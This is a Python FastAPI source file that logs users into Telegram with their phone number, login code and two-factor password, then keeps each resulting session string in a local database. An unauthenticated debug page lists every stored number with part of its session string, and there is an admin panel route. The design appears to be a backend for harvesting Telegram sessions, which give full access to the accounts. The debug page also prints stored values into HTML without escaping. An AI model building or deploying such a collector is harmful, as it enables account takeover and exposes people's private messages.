import os
import sqlite3
from fastapi import FastAPI, Request, Form, HTTPException
from fastapi.responses import HTMLResponse, JSONResponse
from fastapi.templating import Jinja2Templates
from telethon import TelegramClient
from telethon.sessions import StringSession
from telethon.errors import SessionPasswordNeededError, PhoneCodeInvalidError

app = FastAPI()
templates = Jinja2Templates(directory=".")

API_ID = int(os.getenv("API_ID"))
API_HASH = os.getenv("API_HASH")
DB = "sessions.db"

# In-memory clients: phone → client
CLIENTS = {}

# Init DB
conn = sqlite3.connect(DB)
conn.execute("CREATE TABLE IF NOT EXISTS sessions (phone TEXT UNIQUE, session TEXT, time TEXT)")
conn.close()

def save_session(phone: str, session: str):
    conn = sqlite3.connect(DB)
    conn.execute("REPLACE INTO sessions (phone, session, time) VALUES (?, ?, datetime('now'))", (phone, session))
    conn.commit()
    conn.close()
    if phone in CLIENTS:
        del CLIENTS[phone]

@app.get("/", response_class=HTMLResponse)
async def home(request: Request):
    phone = request.query_params.get("phone")
    return templates.TemplateResponse("index.html", {"request": request, "phone": phone})

@app.post("/send")
async def send_code(phone: str = Form(...)):
    if phone in CLIENTS:
        return JSONResponse({"error": "Already in progress."})
    
    client = TelegramClient(StringSession(), API_ID, API_HASH)
    try:
        await client.connect()
        await client.send_code_request(phone)
        CLIENTS[phone] = client
        return JSONResponse({"ok": True})
    except Exception as e:
        if client.is_connected():
            await client.disconnect()
        return JSONResponse({"error": str(e)})

@app.post("/verify")
async def verify(phone: str = Form(...), code: str = Form(...), pwd: str = Form("")):
    if phone not in CLIENTS:
        return JSONResponse({"error": "Session expired. Try again."})
    
    client = CLIENTS[phone]
    try:
        if pwd:
            await client.sign_in(phone, code, password=pwd)
        else:
            await client.sign_in(phone, code)
        session_str = client.session.save()
        await client.disconnect()
        save_session(phone, session_str)
        del CLIENTS[phone]
        return JSONResponse({"session": session_str})
    except SessionPasswordNeededError:
        return JSONResponse({"needs_password": True})
    except PhoneCodeInvalidError:
        return JSONResponse({"error": "Wrong code. Try again."})
    except Exception as e:
        return JSONResponse({"error": str(e)})

# DEBUG: View all sessions
@app.get("/debug", response_class=HTMLResponse)
async def debug():
    conn = sqlite3.connect(DB)
    c = conn.cursor()
    c.execute("SELECT phone, session, time FROM sessions ORDER BY time DESC")
    rows = c.fetchall()
    conn.close()
    return f"""
    <h2>Debug: Saved Sessions ({len(rows)})</h2>
    <pre>{chr(10).join([f"{r[0]} → {r[1][:60]}..." for r in rows])}</pre>
    <a href="/">← Back</a>
    """

# ADMIN PANEL
@app.get("/admin", response_class=HTMLResponse)
async def admin_panel():
    return templates.TemplateResponse("admin.html", {"request": None})
